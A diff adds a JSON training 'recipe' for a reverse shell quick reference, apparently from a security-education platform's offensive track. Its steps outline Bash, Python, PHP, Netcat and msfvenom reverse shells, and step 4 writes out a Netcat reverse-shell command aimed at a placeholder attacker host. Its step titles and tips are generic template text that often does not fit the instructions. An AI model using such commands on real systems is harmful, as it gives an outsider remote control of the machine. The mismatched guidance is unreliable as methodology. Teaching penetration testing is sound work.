@@ -1,0 +1,74 @@
+{
+  "recipe_id": "RI14",
+  "title": "Reverse Shell Quick Reference",
+  "track": "Offensive",
+  "tier": "Intermediate",
+  "pillar": "Exploitation Fundamentals",
+  "pillar_icon": "\ud83d\udca5",
+  "estimated_time": "15 min",
+  "difficulty": "Intermediate",
+  "tools_required": [
+    "Bash",
+    "Python",
+    "PHP",
+    "Netcat",
+    "msfvenom"
+  ],
+  "when_to_use": "When manual exploitation requires reverse shells",
+  "linked_missions": [
+    "OI-M09",
+    "OI-M10"
+  ],
+  "step_count": 7,
+  "steps": [
+    {
+      "number": 1,
+      "title": "Initial Setup/Scanning",
+      "instruction": "Craft and execute Bash reverse shell command connecting to attacker listener",
+      "tip": "Start with the most reliable information source for reverse shell quick reference",
+      "expected_output": "Remote shell access via bash with command execution capability"
+    },
+    {
+      "number": 2,
+      "title": "Data Collection/Configuration",
+      "instruction": "Create Python reverse shell one-liner for target systems with Python installed",
+      "tip": "Organize data systematically to avoid duplicates and ensure coverage",
+      "expected_output": "Working Python reverse shell with interactive command execution"
+    },
+    {
+      "number": 3,
+      "title": "Analysis/Enumeration",
+      "instruction": "Generate PHP reverse shell for web application exploitation scenarios",
+      "tip": "Look for patterns and correlations in collected data",
+      "expected_output": "Functional PHP reverse shell for web shell deployment"
+    },
+    {
+      "number": 4,
+      "title": "Advanced Technique/Filtering",
+      "instruction": "Use Netcat with -e flag for direct shell execution: nc -e /bin/sh ATTACKER PORT",
+      "tip": "Use multiple techniques to increase coverage and accuracy",
+      "expected_output": "Reverse shell session established through Netcat"
+    },
+    {
+      "number": 5,
+      "title": "Correlation/Testing",
+      "instruction": "Generate ELF binary payload using msfvenom for Linux target systems",
+      "tip": "Validate findings across different tools and methods",
+      "expected_output": "Compiled executable msfvenom payload ready for deployment"
+    },
+    {
+      "number": 6,
+      "title": "Validation/Exploitation",
+      "instruction": "Set up Netcat listener on attacker machine to receive reverse connections",
+      "tip": "Document proof-of-concept evidence for credibility",
+      "expected_output": "Listening Netcat session ready to catch incoming reverse shells"
+    },
+    {
+      "number": 7,
+      "title": "Documentation/Reporting",
+      "instruction": "Stabilize shell session using Python pty module for interactive terminal",
+      "tip": "Review all findings before compilation for accuracy and completeness",
+      "expected_output": "Fully interactive shell with proper terminal features and escape sequence handling"
+    }
+  ]
+}
